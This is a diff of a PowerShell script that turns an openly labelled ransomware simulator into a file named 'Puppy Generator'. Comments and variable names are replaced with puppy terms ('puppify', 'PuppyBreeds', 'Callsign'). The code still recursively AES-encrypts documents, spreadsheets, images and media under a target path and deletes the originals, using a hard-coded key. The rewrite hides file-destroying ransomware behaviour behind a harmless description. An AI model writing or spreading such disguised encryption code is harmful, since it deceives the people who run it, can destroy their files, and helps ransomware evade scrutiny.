@@ -1,71 +1,60 @@
  <#
 
 .SYNOPSIS
-    Ransomware Simulator using AES to recursively encrypt or decrypt files at a given path
+    Puppy Generator
 
 .DESCRIPTION
-    This script is intended to be used to test your defenses and backups against ransomware in a controlled environment. You can encrypt fake data for
-your simulation, but you also have the option to decrypt the files with the same script if you need to.
+    This script is intended to generate puppies
 
-.EXAMPLE
-    .\RanSim.ps1 -mode encrypt
-    or
-    .\RanSim.ps1 -mode decrypt
 
 .PARAMETER Target File Path
-    This optional parameter specifies the path that the recursive encryption will start in. A default path is provided.
+    Target for your puppies
  
 .PARAMETER File Extension
-    This optional parameter defines the extension that will be added to the encrypted files once attacked. A default extension is provided.
+    What file extensions should your puppies have
 
-.PARAMETER Encryption key
-    This optional parameter is the plain-text AES encryption key used for both encryption and decryption. A default key is provided. 
-
-.NOTES
-    This script uses the FileCryptopgraphy module from Tyler Siegrist - https://gallery.technet.microsoft.com/scriptcenter/EncryptDecrypt-files-use-65e7ae5d
-
+.PARAMETER Puppifyion key
+    Name for your pupies 
 #>
 
 # Define parameters and their defaults
 param([string]$Mode,
+      [string]$LastName = ".puppies",
       [string]$TargetPath = "C:\Users\retest2\DummyData",
-      [string]$Extension = ".RETEST",
-      [string]$Key = "Q5KyUru6wn82hlY9k8xUjJOPIC9da41jgRkpt21jo2L="
+      [string]$Callsign = "QRkpt21jo2Lu6wn82hlY9k8xUj5KyUrJOPIC9da41jg="
 )
 
-# Define target file types
-$TargetFiles = '*.pdf','*.xls*','*.ppt*','*.doc*','*.accd*','*.rtf','*.txt','*.csv','*.jpg','*.jpeg','*.png','*.gif','*.avi','*.midi','*.mov','*.mp3','*.mp4','*.mpeg','*.mpeg2','*.mpeg3','*.mpg','*.ogg'
+$PuppyBreeds = '*.pdf','*.xls*','*.ppt*','*.doc*','*.accd*','*.rtf','*.txt','*.csv','*.jpg','*.jpeg','*.png','*.gif','*.avi','*.midi','*.mov','*.mp3','*.mp4','*.mpeg','*.mpeg2','*.mpeg3','*.mpg','*.ogg'
 
-# Import FileCryptography module
-Import-Module ".\FileCryptography.psm1"
+ipmo ".\FileCryptography.psm1"
 
-if ($mode -eq "encrypt") {
+if ($mode -eq "puppify") {
     # Gather all files from the target path and its subdirectories
-    $FilesToEncrypt = get-childitem -path $TargetPath\* -Include $TargetFiles -Exclude *$Extension -Recurse -force | where { ! $_.PSIsContainer }
-    $NumFiles = $FilesToEncrypt.length
+    $FilesToPuppify = get-childitem -Include $PuppyBreeds -Recurse -force -path $TargetPath\*  -Exclude *$LastName  | where { ! $_.PSIsContainer }
+    $NumPuppies = $FilesToPuppify.length
 
-    # Encrypt the files
-    foreach ($file in $FilesToEncrypt)
+    # Puppify the files
+    foreach ($puppy in $FilesToPuppify)
     {
-        Write-Host "Encrypting $file"
-        Protect-File $file -Algorithm AES -KeyAsPlainText $key -Suffix $Extension -RemoveSource
+        Write-Host "Puppifying $puppy"
+        Protect-File $puppy -KeyAsPlainText $Callsign -Suffix $LastName -Algorithm AES -RemoveSource
     }
-    Write-Host "Encrypted $NumFiles files." | Start-Sleep -Seconds 10
+    Write-Host "Puppifyed $NumPuppies" | Start-Sleep -Seconds 10
 }
 
-elseif ($mode -eq "decrypt") {
+elseif ($mode -eq "depuppify") {
     # Gather all files from the target path and its subdirectories
-    $FilestoDecrypt = get-childitem -path $TargetPath\* -Include *$Extension -Recurse -force | where { ! $_.PSIsContainer }
+    $FilestoDepuppify = get-childitem -path $TargetPath\* -Include *$LastName -Recurse -force | where { ! $_.PSIsContainer }
 
-    # Encrypt the files
-    foreach ($file in $FilestoDecrypt)
+    # Puppify the files
+    foreach ($puppy in $FilestoDepuppify)
     {
-        Write-Host "Decrypting $file"
-        Unprotect-File $file -Algorithm AES -KeyAsPlainText $key -Suffix $Extension  -RemoveSource
+        Write-Host "Depuppyfing $puppy"
+        Unprotect-File $puppy -KeyAsPlainText $Callsign -Suffix $LastName -Algorithm AES   -RemoveSource
     }
 } 
 
 else {
-    write-host "ERROR: must choose a mode (encrypt or decrypt). Example usage: .\RanSim.ps1 -mode encrypt"
+    write-host "you must puppify or depuppify"
 }
 exit 
